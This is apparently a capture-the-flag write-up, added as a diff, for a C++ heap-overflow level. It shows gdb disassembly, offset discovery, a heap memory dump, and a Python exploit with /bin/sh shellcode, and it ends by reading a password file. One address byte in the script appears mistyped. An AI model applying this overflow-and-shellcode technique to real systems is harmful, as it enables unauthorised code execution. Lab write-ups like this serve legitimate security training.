@@ -18,3 +18,98 @@ print(CONTENT)
 ```
 
 ./level9 $(python exploit.py)
+
+$ ./level9
+=>
+$ ./level9 adsfads
+=>
+$ ./level9 asdfa adsfads
+=>
+
+Nothing seems to do anything. so we start to disas the main
+$ gdb level9
+$ (gdb) disas main
+    0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
+    0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
+    0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
+    0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+    0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+    0x08048693 <+159>:	call   *%edx
+
+At first, we can see this function <_Znwj> which is, a <new>, so we can deduce we're facing c++ code.
+
+the code is instancing 2 times the same class and then call the method of the class from the first instance :
+    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+We can see that there's a little security that calls <exit> if we don't have at least one argument since this function takes argv[1] as argument.
+
+$ (gdb) disas _ZN1N13setAnnotationEPc
+    0x0804871a <+12>:	call   0x8048520 <strlen@plt>
+    0x08048722 <+20>:	add    $0x4,%edx
+    0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+
+So here's how we will proceed :
+
+First, we find the offset
+
+$ (gdb) run 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeee'
+$ (gdb) i r
+eax            0x62626262
+the offset is at "bbbb", so the offset is 108
+
+
+Then, we disas the main to get the address where the function with our argument will be executed to see how the memory is gonna be after our input.
+
+$ (gdb) disas main
+    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+
+break at the address
+$ (gdb) b*0x08048677
+
+run the programm
+$ (gdb) run 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+
+get the stack pointer address
+$ (gdb) x $esp
+0xbffff680:	0x0804a008
+
+step forward
+$ (gdb) s
+
+Print the memory at this address
+$ (gdb) x/100xg 0x0804a008
+0x804a008:	0x4141414108048848	0x4141414141414141
+0x804a018:	0x4141414141414141	0x4141414141414141
+0x804a028:	0x4141414141414141	0x4141414141414141
+0x804a038:	0x4141414141414141	0x4141414141414141
+0x804a048:	0x4141414141414141	0x4141414141414141
+0x804a058:	0x4141414141414141	0x4141414141414141
+0x804a068:	0x4141414141414141	0x4141414141414141
+0x804a078:	0x4141414141414141	0x4141414141414141
+0x804a088:	0x0041414141414141	0x0000000000000000
+0x804a098:	0x0000000000000000	0x0000000000000000
+0x804a0a8:	0x0000000000000000	0x0000000000000000
+
+Now that we just found where our buffer is stored, we'll be able to play with it.
+
+Thanks to the double dereferencement of EAX, we are able to store 2 address in it, one that will point on the other, and the other that will point on our shellcode which will be executed.
+
+
+```python
+#! /usr/bin/env python
+
+OFFSET = "A" * 108
+
+ADDR = "\x7c\xa0\x04\x08"
+
+ADDR1 = "\x80\xa0\04\x08"
+
+SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+CONTENT = OFFSET + ADDR + ADDR1 + SHELLCODE
+
+print(CONTENT)
+```
+
+$ cat /home/user/bonus0/.pass
+=> f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
